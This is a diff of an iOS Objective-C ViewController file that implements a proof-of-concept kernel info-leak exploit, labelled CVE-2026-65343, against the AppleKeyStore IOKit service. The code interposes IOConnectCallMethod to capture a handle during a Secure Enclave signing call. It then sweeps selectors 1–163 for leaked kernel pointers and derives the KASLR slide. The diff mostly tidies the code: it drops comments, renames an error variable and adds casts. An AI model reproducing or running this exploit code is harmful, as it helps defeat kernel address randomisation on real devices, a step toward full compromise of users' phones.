@@ -1,12 +1,14 @@
 //
 //  ViewController.m
 //  Test — CVE-2026-65343 AppleKeyStore OOB read → KASLR
-//  UI: кнопка запускает probe, результат на экран (в UITextView)
 //
 #import "ViewController.h"
-#import <IOKit/IOKitLib.h>
-#import <mach/mach.h>
+#import <stdint.h>
+#import <string.h>
+#import <stdio.h>
 #import <dlfcn.h>
+#import <mach/mach.h>
+#import <IOKit/IOKitLib.h>
 #import <Security/Security.h>
 #import <Foundation/Foundation.h>
 
@@ -18,7 +20,6 @@ static void logline(NSString *s) {
     });
 }
 
-/* DYLD_INTERPOSE для перехвата IOConnectCallMethod */
 #ifndef DYLD_INTERPOSE
 #define DYLD_INTERPOSE(_replacement, _replacee)                          \
     __attribute__((used))                                                 \
@@ -116,18 +117,19 @@ static int trigger_se_iokit_call(void) {
     logline(@"[se] key OK, signing...");
     const uint8_t msg[32] = {0xDE,0xAD,0xBE,0xEF};
     CFDataRef msgRef = CFDataCreate(NULL, msg, 32);
+    CFErrorRef sigErr = NULL;
     CFDataRef sig = SecKeyCreateSignature(privKey,
-        kSecKeyAlgorithmECDSASignatureMessageX962SHA256, msgRef, &cfErr);
+        kSecKeyAlgorithmECDSASignatureMessageX962SHA256, msgRef, &sigErr);
     CFRelease(msgRef); CFRelease(privKey);
     if (sig) { logline([NSString stringWithFormat:@"[se] sign OK %ld bytes", (long)CFDataGetLength(sig)]); CFRelease(sig); return 1; }
-    NSString *d = cfErr ? [(__bridge NSError *)cfErr description] : @"?";
+    NSString *d = sigErr ? [(__bridge NSError *)sigErr description] : @"?";
     logline([NSString stringWithFormat:@"[se] sign fail: %@", d]);
-    if (cfErr) CFRelease(cfErr);
+    if (sigErr) CFRelease(sigErr);
     return g_capture_done ? 1 : 0;
 }
 
 #define OUTBUF_SZ 0x2000
-#define FILL_BYTE 0xBBu
+#define FILL_BYTE 0xBB
 #define DECLARED  0x0800u
 #define KERN_BASE_STATIC 0xfffffff007004000ULL
 
@@ -149,14 +151,13 @@ static uint64_t probe_selector(io_connect_t conn, const uint8_t handle[16], int 
     kern_return_t kr = real_IOConnectCallMethod(
         conn, (uint32_t)sel, NULL, 0, msg, sizeof(msg),
         scalo, &scaln, outbuf, &outsz);
-    int found = 0;
+    (void)kr;
     uint64_t slide = 0;
     for (size_t i = 0; i + 8 <= outsz; i += 8) {
         uint64_t v = 0;
         memcpy(&v, outbuf + i, 8);
         if (looks_like_kptr(v)) {
             logline([NSString stringWithFormat:@"  sel=%d KPTR @+%04zx = %#018llx", sel, i, v]);
-            found++;
             if (!slide) {
                 uint64_t known_off = 0x18d8774ULL;
                 if ((v & 0xfffULL) == ((KERN_BASE_STATIC + known_off) & 0xfffULL)) {
@@ -175,15 +176,15 @@ static uint64_t probe_selector(io_connect_t conn, const uint8_t handle[16], int 
     if (!svc) { logline(@"service not found"); return; }
     io_connect_t conn = 0;
     kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
-    if (kr != KERN_SUCCESS || !conn) { logline([NSString stringWithFormat:@"open fail %#x", kr]); return; }
+    if (kr != KERN_SUCCESS || !conn) { logline([NSString stringWithFormat:@"open fail %#x", (unsigned)kr]); return; }
     logline([NSString stringWithFormat:@"open conn=%#x", conn]);
 
-    // Phase 1: попытка перехватить ACM handle через SE sign
     g_capture_armed = 0; g_capture_done = 0; g_cap_conn = 0; memset(g_cap_handle, 0, 16);
     __asm__ __volatile__("dmb ish" ::: "memory");
     g_capture_armed = 1;
     __asm__ __volatile__("dmb ish" ::: "memory");
     int se_ok = trigger_se_iokit_call();
+    (void)se_ok;
     __asm__ __volatile__("dmb ish" ::: "memory");
     g_capture_armed = 0;
 
@@ -192,7 +193,7 @@ static uint64_t probe_selector(io_connect_t conn, const uint8_t handle[16], int 
     SecItemDelete((__bridge CFDictionaryRef)delQ);
 
     if (!g_capture_done || !g_cap_conn) {
-        logline(@"phase1 fail — fallback zero-handle probe");
+        logline(@"phase1 fail - fallback zero-handle probe");
         uint8_t zero_handle[16] = {0};
         for (int sel = 1; sel <= 163; sel++) {
             uint64_t slide = probe_selector(conn, zero_handle, sel);
@@ -200,7 +201,7 @@ static uint64_t probe_selector(io_connect_t conn, const uint8_t handle[16], int 
         }
         return;
     }
-    logline(@"phase1 OK — probing selectors with real handle");
+    logline(@"phase1 OK - probing selectors with real handle");
     for (int sel = 1; sel <= 163; sel++) {
         uint64_t slide = probe_selector((io_connect_t)g_cap_conn, g_cap_handle, sel);
         if (slide) break;
